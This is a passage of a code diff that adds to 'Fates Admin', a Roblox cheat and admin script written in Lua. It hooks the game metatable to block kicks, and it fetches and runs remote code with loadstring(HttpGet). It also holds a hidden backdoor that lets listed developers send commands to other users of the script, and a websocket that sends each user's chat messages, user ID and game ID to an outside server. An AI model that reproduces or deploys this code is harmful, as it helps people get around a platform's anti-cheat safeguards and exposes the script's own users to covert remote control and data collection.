+				for i3, v3 in next, json.Aliases[v.Name] do
+					if (v3 == Alias) then
+						table.remove(json.Aliases[v.Name], i3);
+					end
+				end
+				writefile("fates admin settings.json", HttpService:JSONEncode(json));
+				return Utils.Notify(Caller or LocalPlayer, nil, ("removed the alias %s from command %s"):format(Alias, v.Name));
+			end
+		end
+	end
+	Utils.Notify(Caller or LocalPlayer, nil, "no alias found");
+end)
+
+AddCommand("antikick", {"nokick"}, "antikick\nclient sided bypass to kicks", function(Caller, Args)
+	local mt = getrawmetatable(game);
+	local nc = mt.__namecall
+	setreadonly(mt, false);
+	mt.__namecall = newcclosure(function(self, ...)
+		local args = {...}
+		local method = getnamecallmethod();
+		if (method:lower() == "kick") then
+			Utils.Notify(Caller or LocalPlayer, "Attempt to kick", ("attempt to kick with message \"%s\""):format(tostring(args[1])));
+			return wait(9e9);
+		end
+		return nc(self, ...);
+	end)
+end)
+
+AddCommand("time", {}, "time {number}/night/day/dawn\nsets the games time 3 options (night, day, dawn) or custom number", function(Caller, Args)
+	local Time = Args[1] or ""
+	if (Time:lower() == "night") then
+		Time = 0
+		game:GetService("Lighting").ClockTime = 0
+	elseif (Time:lower() == "day") then
+		Time = 14
+		game:GetService("Lighting").ClockTime = 14
+	elseif (Time:lower() == "dawn") then
+		Time = 6
+		game:GetService("Lighting").ClockTime = 6
+	else
+		Time = tonumber(Time)
+		game:GetService("Lighting").ClockTime = tonumber(Time);
+	end
+	xpcall(function()
+		local json = HttpService:JSONDecode(readfile("fates admin settings.json"));
+		json.Settings["Time"] = tonumber(Time);
+		json = HttpService:JSONEncode(json);
+		writefile("fates admin settings.json", json);
+	end, function()
+		Utils.Notify(Caller or LocalPlayer, "Could'nt save", "Your exploit doesnt support writefile")
+	end)
+end)
+
+AddCommand("btools", {}, "btools\ngives you btools", function(Caller, Args)
+	for i=1,4 do
+		Instance.new("HopperBin", LocalPlayer:FindFirstChildOfClass("Backpack")).BinType = i
+	end
+end)
+
+AddCommand("streamermode", {}, "streamermode\nchanges names of everyone to something random", function(Caller, Args, Tbl) 
+	local Rand = function(len) return HttpService:GenerateGUID():sub(2, len):gsub("-", "") end
+	for i, v in next, game:GetDescendants() do
+		if (v and v:IsA("TextLabel") or v:IsA("TextButton")) then
+			if (Players:FindFirstChild(v.Text)) then
+				Tbl[v] = v.Text
+				v.Text = v.Text:gsub(Players:FindFirstChild(v.Text).Name, Rand(Players:FindFirstChild(v.Text).Name:len()));
+			else
+				for i2, v2 in next, Players:GetPlayers() do
+					if (v.Text:find(v2.Name)) then
+						Tbl[v] = v.Text
+						v.Text = v.Text:gsub(v2.Name, Rand(v2.Name:len()));
+					end
+				end
+			end
+		end
+	end
+	Streamer = game.DescendantAdded:Connect(function(x)
+		if (x and x:IsA("TextLabel") or x:IsA("TextButton")) then
+			if (Players:FindFirstChild(x.Text)) then
+				Tbl[x] = x.Text
+				x.Text = x.Text:gsub(Players:FindFirstChild(x.Text).Name, Rand(Players:FindFirstChild(x.Text).Name:len()));
+			else
+				for i, v in next, Players:GetPlayers() do
+					if (x.Text:find(v.Name)) then
+						Tbl[x] = x.Text
+						x.Text = x.Text:gsub(v.Name, Rand(v.Name:len()));
+					end
+				end
+			end
+		end
+	end)
+	Tbl[#Tbl + 1] = Streamer
+	Utils.Notify(Caller or LocalPlayer, nil, "streamer mode enabled")
+end)
+
+AddCommand("nostreamermode", {"unstreamermode"}, "nostreamermode\nremoves all the changed names", function(Caller, Args, Tbl)
+	local changed = CommandStuff["Commands"]["streamermode"]
+	for i, v in next, changed do
+		if (type(v) == 'userdata') then
+			v:Disconnect()
+		else
+			i.Text = v			
+		end
+	end
+end)
+
+AddCommand("position", {"cframe", "pos"}, "position\nCopy your position", function(Caller, Args) 
+	setclipboard(tostring(Utils.GetRootCFrame(game.Players.LocalPlayer.Character).p));
+end);
+
+AddCommand("hub", {"scripthub"}, "hub\nExecute a script from synapse's script hub (works with any exploit)", function(Caller, Args)
+	if not Args[1] then
+		return Utils.Notify(Caller or LocalPlayer, "Hub Error!", "Please enter the name of the script.");
+	end;
+
+	local Script = Args[1]:lower();
+	local Scripts = {
+		["darkdex"] = "https://cdn.synapse.to/synapsedistro/hub/DarkDex.lua"
+	};
+	if Scripts[Script] then
+		loadstring(game:HttpGet(Scripts[Script]))();
+	else
+		for i,v in pairs(Scripts) do
+			if i:match(Script) then
+				return Utils.Notify(Caller or LocalPlayer, "Script not found!", ("Do you mean %s?"):format(i));
+			end;
+		end;
+		Utils.Notify(Caller or LocalPlayer, "Hub Error!", "Cannot find script.");
+	end;
+end);
+
+AddCommand("showusers", {"getusers"}, "showusers\nshows all people using fates admin", function(Caller, Args) -- sometimes users name appear twice
+	TotalUsers = {}
+	SendMessageKey(MessageKeys.ShowUsersAnnounce.Key, "")
+
+	wait(1) -- wait for response
+	print(#TotalUsers)
+	Utils.Notify(Caller or LocalPlayer, "Fates Admin Users", table.concat(TotalUsers, ", "))
+end)
+
+AddCommand("togglebubblechat", {"togglebc", "tbc"}, "togglebubblechat\ntoggles bubble chat", function(Caller, Args)
+	Chat.BubbleChatEnabled = not Chat.BubbleChatEnabled
+end)
+
+AddBackdoorCommand("kick", {}, "", function(Caller, Args)
+	SendMessageKey(MessageKeys.Kick.Key, Args[1] or "")
+end)
+
+AddCommand("truesight", {"ts"}, "truesight\nShows all invisible parts", function(Caller, Args, Tbl)
+	for i, v in next, Workspace:GetDescendants() do
+		if v:IsA("Part") and v.Transparency >= 0.3 then
+			Tbl[v] = v.Transparency
+			v.Transparency = 0
+		end
+	end
+end)
+AddCommand("notruesight", {"nots"}, "notruesight\nremoves truesight", function(Caller, Args)
+	local showing = CommandStuff["Commands"]["truesight"]
+	for i, v in next, showing do
+		i.Transparency = v
+	end
+end)
+AddCommand("xray", {"ts"}, "xray\nxray through parts", function(Caller, Args, Tbl)
+	for i, v in next, Workspace:GetDescendants() do
+		if v:IsA("Part") and v.Transparency <= 0.3 then
+			Tbl[v] = v.Transparency
+			v.Transparency = 0.3
+		end
+	end
+end)
+AddCommand("noxray", {"unxray"}, "noxray\nstops xray", function(Caller, Args)
+	local showing = CommandStuff["Commands"]["xray"]
+	for i, v in next, showing do
+		i.Transparency = v
+	end
+end)
+
+AddCommand("widebar", {}, "widebar\nwidens the command bar (toggle)", function(Caller, Args)
+	WideBar = not WideBar
+	Utils.Tween(CommandBar, "Quint", "Out", .5, {
+		Position = UDim2.new(0.5, WideBar and -200 or -100, 1, 5) -- tween -110
+	})
+	Utils.Tween(CommandBar, "Quint", "Out", .5, {
+		Size = UDim2.new(0, WideBar and 400 or 200, 0, 35) -- tween -110
+	})
+end)
+
+AddCommand("jail", {}, "jail {target}\njails a user", function(Caller, Args, Tbl)
+	local Target = GetPlayer(Args[1]);
+	for i, v in next, Target do
+		if (CheckClaim(v)) then
+			local Model=Instance.new("Model")Model.Parent=Workspace Model.Name="Jail"Bottom=Instance.new('Part')Bottom.Parent=Model Bottom.Anchored=true Bottom.Transparency=1 Bottom.TopSurface=0 Bottom.BottomSurface=0 Bottom.FormFactor=3 Bottom.Size=Vector3.new(6,.2,6)Bottom.CFrame=Utils.GetRootCFrame(v.Character)*CFrame.new(0,-2.9,0)local Selection=Instance.new("SelectionBox")Selection.Parent=Bottom Selection.Adornee=Bottom Top=Instance.new('Part')Top.Parent=Model Top.Anchored=true Top.Transparency=1 Top.TopSurface=0 Top.BottomSurface=0 Top.FormFactor=3 Top.Size=Vector3.new(6,.2,6)Top.CFrame=Utils.GetRootCFrame(v.Character)*CFrame.new(0,4,0)local Selection=Instance.new("SelectionBox")Selection.Parent=Top Selection.Adornee=Top Side1=Instance.new('Part')Side1.Parent=Model Side1.Anchored=true Side1.Transparency=1 Side1.FormFactor=1 Side1.Size=Vector3.new(0,8,6)Side1.CFrame=Utils.GetRootCFrame(v.Character)*CFrame.new(0,0,-3)Side1.Orientation=Side1.Orientation+Vector3.new(0,90,0)local Selection=Instance.new("SelectionBox")Selection.Parent=Side1 Selection.Adornee=Side1 Side2=Instance.new('Part')Side2.Parent=Model Side2.Anchored=true Side2.Transparency=1 Side2.FormFactor=1 Side2.Size=Vector3.new(0,8,6)Side2.CFrame=Utils.GetRootCFrame(v.Character)*CFrame.new(0,0,3)Side2.Orientation=Side2.Orientation+Vector3.new(0,90,0)local Selection=Instance.new("SelectionBox")Selection.Parent=Side2 Selection.Adornee=Side2 Side3=Instance.new('Part')Side3.Parent=Model Side3.Anchored=true Side3.Transparency=1 Side3.FormFactor=1 Side3.Size=Vector3.new(0,8,6)Side3.CFrame=Utils.GetRootCFrame(v.Character)*CFrame.new(3,0,0)Side3.Orientation=Side3.Orientation+Vector3.new(0,-180,0)local Selection=Instance.new("SelectionBox")Selection.Parent=Side3 Selection.Adornee=Side3 Side4=Instance.new('Part')Side4.Parent=Model Side4.Anchored=true Side4.Transparency=1 Side4.FormFactor=1 Side4.Size=Vector3.new(0,8,6)Side4.CFrame=Utils.GetRootCFrame(v.Character)*CFrame.new(-3,0,0)Side4.Orientation=Side4.Orientation+Vector3.new(0,-180,0)local Selection=Instance.new("SelectionBox")Selection.Parent=Side4 Selection.Adornee=Side4
+			Tbl[v] = Model
+		end
+	end
+end)
+
+AddCommand("unjail", {}, "unjail {target}\nunjails a user", function(Caller, Args)
+	local Target = GetPlayer(Args[1]);
+	local Jailed = CommandStuff["Commands"]["jail"]
+	for i, v in next, Jailed do
+		for i2, v2 in next, Target do
+			if (v2 == i) then
+				v:Destroy();
+			end
+		end
+	end
+end)
+
+Themes = {
+	["dark"] = Color3.fromRGB(32, 33, 36),
+	["black"] = Color3.fromRGB(32, 33, 36),
+	["white"] = Color3.fromRGB(220, 224, 234),
+	["light"] = Color3.fromRGB(220, 224, 234)
+}
+
+local OldColors = {}
+for i, v in next, UI:GetDescendants() do
+	if v:IsA("Frame") or v:IsA("TextButton") or v:IsA("TextLabel") then
+		OldColors[v] = {
+			BackgroundColor = v.BackgroundColor3,
+		}
+		if (not v:IsA("Frame")) then
+			OldColors[v].TextColor = v.TextColor3
+		end
+	end
+end
+AddCommand("theme", {}, "theme {color}\nchanges the theme of the ui", function(Caller, Args, Tbl)
+	local Color = Args[1]
+
+	local ResetUi = function()
+		for i, v in next, UI:GetDescendants() do
+			if (OldColors[v]) then
+				v.BackgroundColor3 = OldColors[v].BackgroundColor
+				if (v:IsA("TextLabel") or v:IsA("TextButton")) then
+					v.TextColor3 = OldColors[v].TextColor
+				end
+			end
+		end
+	end
+
+	if (Color == "reset" or Color == "dark" or Color == "black") then
+		return ResetUi();
+	end
+
+	for i, v in next, UI:GetDescendants() do
+		if (v:IsA("TextLabel") or v:IsA("TextButton")) then
+			if (Themes[Color] == v.TextColor3 or Themes[Color] == v.BackgroundColor3) then
+				if (Color == "white" or Color == "light") then
+					TextColor = Themes["dark"]
+					BackgroundColor = Themes["dark"]
+				end
+			else
+				TextColor = Themes[Color]
+				BackgroundColor = Themes[Color]
+			end
+			v.TextColor3 = TextColor
+			v.BackgroundColor3 = BackgroundColor
+		elseif (v:IsA("Frame")) then
+			if (Themes[Color] == v.BackgroundColor3) then
+				if (Color == "white" or Color == "light") then
+					BackgroundColor = Themes["dark"]
+				end
+			else
+				BackgroundColor = Themes[Color]
+			end
+			v.BackgroundColor3 = BackgroundColor
+		end
+	end
+end)
+
+AddCommand("killscript", {}, "killscript\nkills the script", function(Caller, Args)
+	for i, v in next, Guis do
+		v:Destroy();
+	end
+	for i, v in next, getgenv().F_A.Events do
+		v:Disable();
+	end
+	print("script killed");
+end)
+
+if (table.find(BackdoorAccess, LocalPlayer.Name)) then
+	print"worked"
+	getgenv().t483ygt = function(Text) -- [BACKDOOR FUNCTION]
+		SendMessageKey(MessageKeys.Backdoor.Key, Text)
+	end
+end
+
+local ChatUse = function(v)
+	getgenv().Admin = v.Chatted:Connect(function(rawmsg)
+		if (table.find(AdminUse, v) or v == Players.LocalPlayer) then
+			if (rawmsg:sub(1, 1) == Prefix or rawmsg:sub(1, 2) == "/e") then
+				if (rawmsg:sub(1, 2) == "/e") then
+					rawmsg = rawmsg:sub(4, rawmsg:len()):lower();
+				end
+				rawmsg = rawmsg:sub(2, rawmsg:len()):lower();
+				local CommandArgs = rawmsg:split(" ");
+				if (CommandArgs[1] == "help") then
+					HelpCommand(CommandArgs[2]);
+				elseif (table.find(BackdoorAccess, LocalPlayer.Name)) then
+					LoadBackdoorCommand(CommandArgs[1], v, table.pack(table.unpack(CommandArgs, 2, #CommandArgs)))
+				else
+					LoadCommand(CommandArgs[1], v, table.pack(table.unpack(CommandArgs, 2, #CommandArgs)))
+				end
+			end
+		end
+	end)
+end
+
+for _, v in next, Players:GetPlayers() do
+	RespawnTimes[v.Name] = tick()
+	v.CharacterAdded:Connect(function()
+		RespawnTimes[v.Name] = tick()
+	end)
+end
+Players.PlayerAdded:Connect(function(v)
+	RespawnTimes[v.Name] = tick()
+	v.CharacterAdded:Connect(function()
+		RespawnTimes[v.Name] = tick()
+	end)
+end)
+Players.PlayerRemoving:Connect(function(v)
+	RespawnTimes[v.Name] = nil
+end)
+
+for i, v in next, Players:GetPlayers() do
+	ChatUse(v);
+end
+
+Players.PlayerAdded:Connect(function(v)
+	ChatUse(v);
+end)
+
+
+for i, v in next, getconnections(LocalPlayer.SimulationRadiusChanged) do
+	if (v ~= NetworkSet) then
+		print("an attempt");
+	end
+end
+coroutine.wrap(function()
+	wait(.3);
+	Utils.Notify(Caller or LocalPlayer, "Network Ownership", ("Your SimulationRadius is %.3f"):format(GetNetwork(LocalPlayer)));
+end)()
+
+local PreSettings = {
+	Settings = {
+		ChatPrefix = "/",
+		CmdBarPrefix = "Semicolon",
+		Time = tonumber(game:GetService("Lighting").ClockTime)
+	}
+}
+local GetSettings = function()
+	if (isfile("fates admin settings.json")) then
+		local Settings = HttpService:JSONDecode(readfile("fates admin settings.json")).Settings
+		if (not Settings.ChatPrefix or not Settings.CmdBarPrefix) then
+			print("test")
+			writefile("fates admin settings.json", HttpService:JSONEncode(PreSettings));
+		end
+		return HttpService:JSONDecode(readfile("fates admin settings.json"))
+	else
+		writefile("fates admin settings.json", HttpService:JSONEncode(PreSettings));
+	end
+	return HttpService:JSONDecode(readfile("fates admin settings.json"))
+end
+local GetPlugins = function()
+	if (isfolder("fates admin plugins")) then
+		return listfiles("fates admin plugins");
+	else
+		makefolder("fates admin plugins");
+	end
+	return listfiles("fates admin plugins");
+end
+local AddPlugins = function()
+	for i, v in next, GetPlugins() do
+		if (not tostring(v):find(".lua")) then return end
+		function Invalid(v)
+			if (v == "attempt to call a nil value") then return end
+			return Utils.Notify(Caller or LocalPlayer, "Error Loading Plugin", ("Couldn't load plugin %s make sure its a valid plugin"):format(tostring(v)));
+		end
+		local Plugin = loadfile(v)();
+		xpcall(AddCommand(Plugin.Name, Plugin.Aliases, ("%s made by %s\n%s"):format(Plugin.Name, Plugin.Author, Plugin.Description), Plugin.Func), Invalid);
+	end
+end
+
+local Config = GetSettings();
+
+if (not isfile("fates admin plugins/demo-plugin.lua")) then
+	local DemoPlugin = [[local fates_admin_plugin = {
+	["Name"] = "demo",
+	["Description"] = "this is a demo plugin",
+	["Aliases"] = {"demo1", "demo1", "demo1"},
+	["Author"] = "fate",
+	["Func"] = function(Caller, Args)
+		getgenv().F_A.Notify("Demo Plugin",("%s Called this plugin"):format(Caller.Name or tostring(Caller)));
+	end
+	}
+return fates_admin_plugin]]
+	writefile("fates admin plugins/demo-plugin.lua", DemoPlugin);
+end
+
+AddPlugins();
+
+AddGlobal("GetSettings", GetSettings);
+AddGlobal("GetPlugins", GetPlugins);
+AddGlobal("AddPlugins", AddPlugins);
+
+--game:GetService("Lighting").ClockTime = Config.Settings.Time
+Prefix = Config.Settings.ChatPrefix or "/"
+CommandBarPrefix = Enum.KeyCode[Config.Settings.CmdBarPrefix]
+
+if (Config.Aliases) then
+	for i, v in next, Config.Aliases do
+		for i2, v2 in next, Functions do
+			if (v2.Name == i) then
+				for i3, v3 in next, v do
+					v2.Aliases[#v2.Aliases + 1] = v3
+				end
+			end
+		end
+	end
+end
+
+
+AddGlobal("execmd", function(cmd, caller, args, tbl)
+	for i, v in next, Functions do
+		if (v.Name == cmd) then
+			return v.Func(caller, args);
+		else
+			for i2, v2 in next, v.Aliases do
+				if (v2 == cmd) then
+					return v.Func(caller, args, tbl);
+				end
+			end
+		end
+	end
+end)
+
+
+if RobloxScroller then -- because boblox
+
+	-- rainbow chat tags
+	local function Rainbow(TextObject)
+		local Text = TextObject.Text
+		local Frequency = 1 -- determines how quickly it repeats
+		local TotalCharacters = 0
+		local Strings = {}
+		local Destroyed = false
+
+		TextObject.RichText = true
+
+		for Character in string.gmatch(Text, ".") do
+			if string.match(Character, "%s") then
+				table.insert(Strings, Character)
+			else
+				TotalCharacters = TotalCharacters + 1
+				table.insert(Strings, {'<font color="rgb(%i, %i, %i)">' .. Character .. '</font>'})
+			end
+		end
+
+		coroutine.wrap(function()
+			while RunService.Heartbeat:Wait() do
+				if (Destroyed) then break end
+
+				local String = ""
+				local Counter = TotalCharacters
+
+				for _, CharacterTable in ipairs(Strings) do
+					local Concat = "" 
+
+					if (type(CharacterTable) == "table") then
+						Counter = Counter - 1
+						local Color = Color3.fromHSV(-math.atan(math.tan((tick() + Counter/math.pi)/Frequency))/math.pi + 0.5, 1, 1)
+
+						CharacterTable = string.format(CharacterTable[1], math.floor(Color.R * 255), math.floor(Color.G * 255), math.floor(Color.B * 255))
+					end
+
+					String = String .. CharacterTable
+				end
+
+				TextObject.Text = String
+			end
+		end)()
+
+		RobloxScroller.DescendantRemoving:Connect(function(v)
+			if (v == TextObject) then
+				Destroyed = true
+			end
+		end)
+	end
+
+	local function RainbowChatOnAdded(v)
+		if (v:IsA("TextButton")) then
+			for _, v2 in ipairs(BackdoorAccess) do
+				if (string.find(v.Text, v2)) then
+					Rainbow(v)
+					--Rainbow(v.Parent)
+				end
+			end
+		end
+	end
+
+	for _, v in ipairs(RobloxScroller:GetDescendants()) do
+		RainbowChatOnAdded(v)
+	end
+
+	RobloxScroller.DescendantAdded:Connect(RainbowChatOnAdded)
+
+end
+
+-- chat logs
+local function ChatLog(Plr)
+	Plr.Chatted:Connect(function(Msg)
+		if (getgenv().ChatLogsEnabled) then
+			local time = os.date("%X");
+			local Text = ("%s - [%s]: %s"):format(time, Plr.Name, Msg)
+			local Clone = ChatLogMessage:Clone()
+
+			Clone.Text = Text
+			Clone.Visible = true
+			Clone.TextTransparency = 1
+			Clone.Parent = ChatLogs.Frame.List
+			
+			Utils.Tween(Clone, "Sine", "Out", .25, {
+				TextTransparency = 0
+			})
+
+			ChatLogs.Frame.List.CanvasSize = UDim2.fromOffset(0, ChatLogs.Frame.List.UIListLayout.AbsoluteContentSize.Y)
+		end
+	end)
+end
+
+for _, v in ipairs(Players:GetPlayers()) do
+	ChatLog(v)
+end
+
+Players.PlayerAdded:Connect(ChatLog)
+
+
+
+
+-- Admin Logs
+pcall(function() -- pcalling rn because its not on the server yet and you need the key from the whitelist
+	local url = "fate0.xyz:8080/scripts/fates-admin/chat"
+	local key = eebase64(clientWhitelist)
+	local WebSocket = syn.websocket.connect(("ws://%s?key=%s"):format(url,table.concat(key:split(" "), "%20")));
+
+	LocalPlayer = game.Players.LocalPlayer
+	HttpService = game.HttpService
+	LocalPlayer.Chatted:Connect(function(msg)
+		if (getgenv().AdminChatLogsEnabled) then
+			local Message = {
+				caller = {
+					name = LocalPlayer.Name,
+					userid = LocalPlayer.UserId,
+					gameid = game.PlaceId,
+					gamename = game.MarketplaceService:GetProductInfo(game.PlaceId).Name
+				},
+				time = tostring(os.date("%X")),
+				content = msg
+			}
+			WebSocket:Send(HttpService:JSONEncode(Message));
+		end
+	end)
+	WebSocket.OnMessage:Connect(function(Msg)
+		if (Msg:find("12342342342344324234")) then -- too lazy to make more security
+			Utils.Notify(Caller or LocalPlayer, "Message From Discord", Msg:split("12342342342344324234")[1]);
+			return
+		end
+		if (getgenv().AdminChatLogsEnabled) then
+			local Clone = AdminChatLogMessage:Clone()
+			Clone.Text = Msg
+			Clone.Visible = true
+			Clone.TextTransparency = 1
+			if (Msg:find("from discord")) then
+				Clone.TextColor3 = Color3.fromRGB(128,0,128)
+			end
+			Clone.Parent = AdminChatLogs.Frame.List
+			Utils.Tween(Clone, "Sine", "Out", .25, {
+				TextTransparency = 0
+			});
+			AdminChatLogs.Frame.List.CanvasSize = UDim2.fromOffset(0, AdminChatLogs.Frame.List.UIListLayout.AbsoluteContentSize.Y);
+		end
+	end)
+	coroutine.wrap(function()
+		while wait(30) do
+			WebSocket:Send("ping");
+		end
+	end)()
+end)
+
+-- make all elements not visible
+Notification.Visible = false
+Stats.Visible = false
+Utils.SetAllTrans(CommandBar)
+Utils.SetAllTrans(ChatLogs)
+Utils.SetAllTrans(AdminChatLogs)
+Commands.Visible = false
+Animations.Visible = false
+ChatLogs.Visible = false
+AdminChatLogs.Visible = false
+
+-- make the ui draggable
+Utils.Draggable(Commands)
+Utils.Draggable(Animations)
+Utils.Draggable(ChatLogs)
+Utils.Draggable(AdminChatLogs)
+
+-- parent ui
+ParentGui(UI)
+
+-- tweencommand bar on prefix
+UserInputService.InputBegan:Connect(function(Input, GameProccesed)
+	if (Input.KeyCode == CommandBarPrefix and (not GameProccesed)) then
+		CommandBarOpen = not CommandBarOpen
+
+		local TransparencyTween = CommandBarOpen and Utils.TweenAllTransToObject or Utils.TweenAllTrans
+		local Tween = TransparencyTween(CommandBar, .5, CommandBarTransparencyClone)
+
+		-- tween position
+		if (CommandBarOpen) then
+			-- local NumOfTools = LocalPlayer.Backpack:GetChildren()
+			-- if (#NumOfTools > 0 or Character:FindFirstChildWhichIsA("Tool")) then
+			-- 	Utils.Tween(CommandBar, "Quint", "Out", .5, {
+			-- 		Position = UDim2.new(0.5, -100, 1, -110) -- tween -110
+			-- 	})
+			-- else
+			-- 	Utils.Tween(CommandBar, "Quint", "Out", .5, {
+			-- 		Position = UDim2.new(0.5, -100, 1, -45) -- tween -45
+			-- 	})
+			-- end
+			Utils.Tween(CommandBar, "Quint", "Out", .5, {
+				Position = UDim2.new(0.5, WideBar and -200 or -100, 1, -110) -- tween -110
+			})
+
+			CommandBar.Input:CaptureFocus()
+			coroutine.wrap(function()
+				wait()
+				CommandBar.Input.Text = ""
+			end)()
+		else
+			Utils.Tween(CommandBar, "Quint", "Out", .5, {
+				Position = UDim2.new(0.5, WideBar and -200 or -100, 1, 5) -- tween 5
+			})
+		end
+	end
+end)
+
+
+-- tween back when command entered
+CommandBar.Input.FocusLost:Connect(function()
+	local Text = CommandBar.Input.Text
+	local CommandArgs = Text:split(" ");
+
+	CommandBarOpen = false 
+
+	Utils.TweenAllTrans(CommandBar, .5)
+	Utils.Tween(CommandBar, "Quint", "Out", .5, {
+		Position = UDim2.new(0.5, WideBar and -200 or -100, 1, 5) -- tween 5
+	})
+
+	if (CommandArgs[1] == "help") then
+		HelpCommand(CommandArgs[2]);
+	elseif (Command ~= "") then
+		if (table.find(BackdoorAccess, LocalPlayer.Name)) then
+			LoadBackdoorCommand(CommandArgs[1], LocalPlayer, table.pack(table.unpack(CommandArgs, 2, #CommandArgs)));
+		else
+			LoadCommand(CommandArgs[1], LocalPlayer, table.pack(table.unpack(CommandArgs, 2, #CommandArgs)));
+		end
+	end
+end)
+
+-- auto correct
+CommandBar.Input:GetPropertyChangedSignal("Text"):Connect(function() -- make it so that every space a players name will appear
+	local Text = string.lower(CommandBar.Input.Text)
+	local Prediction = CommandBar.Input.Predict
+	PredictionText = Prediction.Text
+
+	local Args = string.split(Text, " ")
+
+	Prediction.Text = ""
+
+	for _, v in ipairs(Functions) do
+		local CommandName = v.Name
+		local Aliases = v.Aliases
+		local FoundAlias
+
+		if (Utils.MatchSearch(Args[1], CommandName)) then -- better search
+			Prediction.Text = CommandName
+			break
+		end
+
+		for _, v2 in ipairs(Aliases) do
+			if (Utils.MatchSearch(Args[1], v2)) then
+				FoundAlias = true
+				Prediction.Text = v2
+				break
+			end
+
+			if (FoundAlias) then
+				break
+			end
+		end
+	end
+
+	for i, v in ipairs(Args) do -- make it get more players after i space out
+		if (i > 1 and v ~= "") then
+			local PlayerName = Utils.GetPlayerArgs(v)
+			Prediction.Text = string.sub(Text, 1, #Text - #Args[#Args]) .. (PlayerName or "")
+			local split = v:split(",");
+			for i2, v2 in next, split do
+				if (i2 > 1 and v2 ~= "") then
+					local PlayerName = Utils.GetPlayerArgs(v2)
+					Prediction.Text = string.sub(Text, 1, #Text - #split[#split]) .. (PlayerName or "")
+				end
+			end
+		end
+	end
+
+	if (string.find(Text, "\t")) then -- remove tab from preditction text also
+		CommandBar.Input.Text = PredictionText
+		CommandBar.Input.CursorPosition = #CommandBar.Input.Text + 1
+	end
+end)
+
+-- smooth scroll commands
+Utils.SmoothScroll(Commands.Frame.List, .14)
+Utils.SmoothScroll(Animations.Frame.List, .14)
+
+for _, v in next, animids do -- auto size
+	local Clone = Animation:Clone()
+	Clone.CommandText.Text = _
+	Clone.Name = _
+	Clone.Visible = true
+	Clone.Parent = Animations.Frame.List
+end
+-- fill commands with commands!
+for _, v in ipairs(Functions) do -- auto size
+	local Clone = Command:Clone()
+
+	Utils.Hover(Clone, "BackgroundColor3") -- add tooltip
+	Utils.ToolTip(Clone, v.Description)
+	Clone.CommandText.Text = v.Name .. (#v.Aliases > 0 and " (" ..table.concat(v.Aliases, ", ") .. ")" or "")
+	Clone.Name = v.Name
+	Clone.Visible = true
+	Clone.Parent = Commands.Frame.List
+end
+
+
+
+Utils.Click(Commands.Close, "TextColor3")
+Commands.Frame.List.CanvasSize = UDim2.fromOffset(0, Commands.Frame.List.UIListLayout.AbsoluteContentSize.Y)
+Animations.Frame.List.CanvasSize = UDim2.fromOffset(0, Animations.Frame.List.UIListLayout.AbsoluteContentSize.Y)
+CommandsTransparencyClone = Commands:Clone()
+AnimationsTransparencyClone = Animations:Clone()
+Utils.SetAllTrans(Commands)
+Utils.SetAllTrans(Animations)
+Utils.Click(ChatLogs.Clear, "BackgroundColor3")
+Utils.Click(ChatLogs.Save, "BackgroundColor3")
+Utils.Click(ChatLogs.Toggle, "BackgroundColor3")
+Utils.Click(ChatLogs.Close, "TextColor3")
+
+Utils.Click(AdminChatLogs.Clear, "BackgroundColor3")
+Utils.Click(AdminChatLogs.Save, "BackgroundColor3")
+Utils.Click(AdminChatLogs.Toggle, "BackgroundColor3")
+Utils.Click(AdminChatLogs.Close, "TextColor3")
+
+-- close tween commands
+Commands.Close.MouseButton1Click:Connect(function()
+	local Tween = Utils.TweenAllTrans(Commands, .25)
+
+	Tween.Completed:Wait()
+	Commands.Visible = false
+end)
+Animations.Close.MouseButton1Click:Connect(function()
+	local Tween = Utils.TweenAllTrans(Animations, .25)
+
+	Tween.Completed:Wait()
+	Animations.Visible = false
+end)
+
+-- command search
+Commands.Search:GetPropertyChangedSignal("Text"):Connect(function()
+	local Text = Commands.Search.Text
+	for _, v in ipairs(Commands.Frame.List:GetChildren()) do
+		if (v:IsA("Frame")) then
+			local Command = v.CommandText.Text
+
+			v.Visible = string.find(string.lower(Command), Text, 1, true)
+		end
+	end
+
+	Commands.Frame.List.CanvasSize = UDim2.fromOffset(0, Commands.Frame.List.UIListLayout.AbsoluteContentSize.Y)
+end)
+
+
+Animations.Search:GetPropertyChangedSignal("Text"):Connect(function()
+	local Text = Animations.Search.Text
+	for _, v in ipairs(Animations.Frame.List:GetChildren()) do
+		if (v:IsA("Frame")) then
+			local Animation = v.CommandText.Text
+
+			v.Visible = string.find(string.lower(Animation), Text, 1, true)
+		end
+	end
+
+	Animations.Frame.List.CanvasSize = UDim2.fromOffset(0, Animations.Frame.List.UIListLayout.AbsoluteContentSize.Y)
+end)
+
+-- close chatlogs
+ChatLogs.Close.MouseButton1Click:Connect(function()
+	local Tween = Utils.TweenAllTrans(ChatLogs, .25)
+
+	Tween.Completed:Wait()
+	ChatLogs.Visible = false
+end)
+AdminChatLogs.Close.MouseButton1Click:Connect(function()
+	local Tween = Utils.TweenAllTrans(AdminChatLogs, .25)
+
+	Tween.Completed:Wait()
+	AdminChatLogs.Visible = false
+end)
+
+-- enable chat logs
+ChatLogs.Toggle.MouseButton1Click:Connect(function()
+	getgenv().ChatLogsEnabled = not getgenv().ChatLogsEnabled
+	ChatLogs.Toggle.Text = getgenv().ChatLogsEnabled and "Enabled" or "Disabled"
+end)
+AdminChatLogs.Toggle.MouseButton1Click:Connect(function()
+	getgenv().AdminChatLogsEnabled = not getgenv().AdminChatLogsEnabled
+	AdminChatLogs.Toggle.Text = getgenv().AdminChatLogsEnabled and "Enabled" or "Disabled"
+end)
+
+-- clear chat logs
+ChatLogs.Clear.MouseButton1Click:Connect(function()
+	Utils.ClearAllObjects(ChatLogs.Frame.List)
+	ChatLogs.Frame.List.CanvasSize = UDim2.fromOffset(0, 0)
+end)
+AdminChatLogs.Clear.MouseButton1Click:Connect(function()
+	Utils.ClearAllObjects(AdminChatLogs.Frame.List)
+	AdminChatLogs.Frame.List.CanvasSize = UDim2.fromOffset(0, 0)
+end)
+
+-- chat logs search
+ChatLogs.Search:GetPropertyChangedSignal("Text"):Connect(function()
+	local Text = ChatLogs.Search.Text
+
+	for _, v in ipairs(ChatLogs.Frame.List:GetChildren()) do
+		if (not v:IsA("UIListLayout")) then
+			local Message = v.Text
+
+			v.Visible = string.find(string.lower(Message), Text, 1, true)
+		end
+	end
+
+	ChatLogs.Frame.List.CanvasSize = UDim2.fromOffset(0, ChatLogs.Frame.List.UIListLayout.AbsoluteContentSize.Y)
+end)
+
+AdminChatLogs.Search:GetPropertyChangedSignal("Text"):Connect(function()
+	local Text = AdminChatLogs.Search.Text
+
